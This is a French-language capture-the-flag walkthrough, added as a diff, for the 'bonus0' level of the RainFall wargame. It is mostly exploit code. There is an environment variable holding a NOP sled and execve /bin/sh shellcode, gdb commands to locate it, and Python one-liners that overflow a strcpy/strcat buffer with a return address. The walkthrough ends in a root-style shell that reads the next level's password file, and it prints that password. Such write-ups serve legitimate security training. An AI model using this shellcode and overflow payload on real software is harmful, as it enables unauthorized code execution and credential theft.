@@ -1,0 +1,34 @@
+du coup debut de bonus 
+je lance le gdb je ne vois pas de system donc peut etre un shellcode a utiliser
+on voit pas mal de fonction y a du strcpy qui est vulnerable et strcat
+
+on prepare l'exploit (on ma donner un tips pour ca merci thallard)
+export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
+
+pour trouver l'addresse il faut break main
+r
+et (gdb) x/s *((char **)environ)
+on a 0xbffff7c7
+x/32wx 0xbffff7c7
+0xbffff7c7:     0x4c505845      0x3d54494f      0x90909090      0x90909090
+0xbffff7d7:     0x90909090      0x90909090      0x90909090      0x90909090
+
+donc on va travailler avec 0xbffff7d7
+
+il faut overflow le premier arg qui est de 4096 on lui met un '\n' car sinon le strchr fait la tete
+
+et ensuite il faut ecrire le script donc l'overflow de 4095 + \n
+(python -c "print 'A' * 4095 + '\n'")
+plus le shellcode + les 15 cara et le \n
+(python -c "print 'A' * 4095 + '\n' + '\xd7\xf7\xff\xbf' + 'A' * 15 + '\n'" ; cat) | ./bonus0
+ca segfault je vai essayer de tatoner les carac
+(python -c "print 'A' * 4095 + '\n' + 'A' * 1 + '\xd7\xf7\xff\xbf' + 'A' * 14 + '\n'" ; cat) | ./bonus0\
+je vais try sinon je vais changer de methode
+
+LETS GOOOOOOO
+bonus0@RainFall:~$ (python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\xd7\xf7\xff\xbf' + 'A' * 7 + '\n'" ; cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
